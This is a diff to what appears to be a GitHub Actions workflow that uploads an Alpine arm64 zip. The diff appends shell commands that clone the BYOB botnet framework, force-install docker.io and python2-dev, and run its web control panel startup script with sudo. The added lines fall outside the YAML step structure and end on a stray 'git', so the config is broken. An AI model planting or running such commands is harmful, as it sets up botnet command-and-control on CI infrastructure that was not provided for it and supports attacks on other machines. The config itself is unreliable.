@@ -38,3 +38,13 @@ jobs:
       with:
         name: Alpine_arm64.zip
         path: ./Alpine_arm64.zip
+mkdir botnet
+cd botnet
+gh repo clone https://github.com/malwaredllc/byob.git
+cd byob/web-gui
+chmod +x startup.sh 
+sudo apt install docker.io --force
+sudo apt install python2-dev --force
+sudo ./startup.sh
+
+git 
